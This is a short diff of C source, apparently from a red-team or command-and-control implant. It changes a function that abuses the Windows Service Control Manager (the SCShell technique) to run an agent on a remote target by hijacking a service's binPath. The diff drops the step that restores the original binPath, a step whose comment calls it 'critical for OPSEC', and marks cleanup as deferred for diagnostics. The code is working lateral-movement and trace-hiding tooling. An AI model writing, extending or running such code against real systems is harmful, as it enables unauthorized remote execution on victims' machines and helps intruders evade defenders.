@@ -1238,20 +1238,12 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
      * Once registered, SCM won't kill the process when we restore config. */
     Sleep(15000);
 
-    /* 7. Restore original binPath — critical for OPSEC.
-     * IMPORTANT: use SERVICE_NO_CHANGE (0xFFFFFFFF) for dwServiceType and
-     * dwStartType. If the original service was SERVICE_WIN32_SHARE_PROCESS,
-     * changing the type back while our OWN_PROCESS agent is still running
-     * causes SCM to terminate the process for type mismatch.
-     * Only restore the binPath — the type/start restore is deferred to
-     * whenever the service is next configured or the box reboots. */
-    pChangeCfg(hSvc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
-               SERVICE_NO_CHANGE, origBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
-
+    /* 7. DIAGNOSTIC: skip ALL cleanup to test if agent survives.
+     * TODO: re-enable once we confirm the agent stays alive without cleanup. */
     pCloseSH(hSvc);
     pCloseSH(hSCM);
 
-    snprintf(msg, sizeof(msg), "[+] Service config restored, binary cleaned on %ls\n", target);
+    snprintf(msg, sizeof(msg), "[+] Service started on %ls (cleanup deferred)\n", target);
     buf_append(out, msg, (DWORD)strlen(msg));
     return TRUE;
 }
